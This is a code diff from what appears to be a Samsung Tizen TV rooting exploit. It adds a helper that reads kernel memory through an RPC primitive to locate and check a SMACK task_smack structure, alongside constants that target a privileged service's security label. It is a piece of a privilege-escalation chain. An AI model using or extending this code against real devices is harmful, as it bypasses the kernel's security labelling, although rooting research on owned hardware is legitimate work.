@@ -28,8 +28,9 @@ import argparse
 import struct
 import sys
 import time
+from pathlib import Path
 
-TOOLS = r"C:\Users\Raghav\Documents\projects\samsung_tv_root\tools"
+TOOLS = str(Path(__file__).resolve().parent)
 sys.path.insert(0, TOOLS)
 
 import physmap as T          # noqa: E402
@@ -44,6 +45,30 @@ SCAN_LO, SCAN_HI = 0x20000000, 0x40000000
 TAG_SCAN_LO, TAG_SCAN_HI = 0x20000000, 0x45F00000
 CUR_LABEL = "User::Pkg::org.tizen.browser"
 TARGET_LABEL = "User::Pkg::com.samsung.tv.MultiControl-Service"
+# cred->security (cred+0x64) is a task_smack: { smk_task, smk_forked, list_head }
+CRED_SECURITY = 0x64
+
+
+def sane_smack_blob(rpc, blob):
+    """Return (smk_task, smk_forked) if `blob` looks like a task_smack, else None.
+
+    A real one holds two kernel label pointers and a self-referential list_head
+    at +8; anything else (a random cred field, ASCII) is rejected before use.
+    """
+    if not T._kernel_ptr(blob):
+        return None
+    try:
+        smk = rpc.read_u32(phys(blob))
+        fk = rpc.read_u32(phys(blob) + 4)
+        nxt, prv = struct.unpack("<2I", rpc.read(phys(blob) + 8, 8))
+    except Exception:
+        return None
+    if not (T._kernel_ptr(smk) and T._kernel_ptr(fk)):
+        return None
+    want = (blob + 8) & 0xFFFFFFFF
+    if nxt != want or prv != want:
+        return None
+    return smk, fk
 
 
 def phys(va):
